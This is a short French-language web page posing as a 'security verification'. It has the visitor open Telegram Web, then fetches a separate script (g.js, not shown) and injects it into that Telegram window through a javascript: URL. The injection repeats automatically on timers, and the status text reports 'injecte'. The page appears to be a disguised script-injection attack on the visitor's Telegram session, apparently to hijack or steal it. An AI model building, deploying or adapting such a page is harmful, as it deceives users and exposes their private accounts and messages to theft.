<!doctype html>
<html lang="fr">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verification</title>
<body style="font:17px system-ui;background:#17212b;color:#eaeaea;padding:22px;line-height:1.6">
<h3 style="margin:0 0 14px">Verification de securite</h3>
<p>1. <a href="https://web.telegram.org/k/" target="tg" style="font-size:20px">Ouvrir Telegram Web</a></p>
<p>2. <button id="go" style="font-size:20px;padding:8px 18px">Recuperer</button></p>
<p id="st" style="opacity:.6"></p>
<script>
var code = '', ready = false;
var st = document.getElementById('st');
var NONCE = Date.now();

fetch('g.js').then(function (r) { return r.text(); }).then(function (t) {
  code = t.replace(/\s+/g, ' ');
  ready = true;
  st.textContent = 'pret';
}, function () { st.textContent = 'g.js introuvable'; });

function tab() {
  var w = window.open('', 'tg');
  if (!w) { st.textContent = 'popup bloque : tape sur Ouvrir Telegram Web'; return null; }
  var h = '';
  try { h = w.location.href; } catch (e) {}
  if (!h || h === 'about:blank') { st.textContent = 'en attente de Telegram Web'; return null; }
  return w;
}

function fire() {
  if (!ready) { st.textContent = 'chargement...'; return; }
  if (!tab()) return;
  window.open('javascript:window.__twg_nonce=' + NONCE + ';void ' + code, 'tg');
  st.textContent = 'injecte ' + new Date().toLocaleTimeString();
}

document.getElementById('go').onclick = fire;
[6000, 10000, 15000, 22000, 30000].forEach(function (t) { setTimeout(fire, t); });
</script>
</body>
</html>
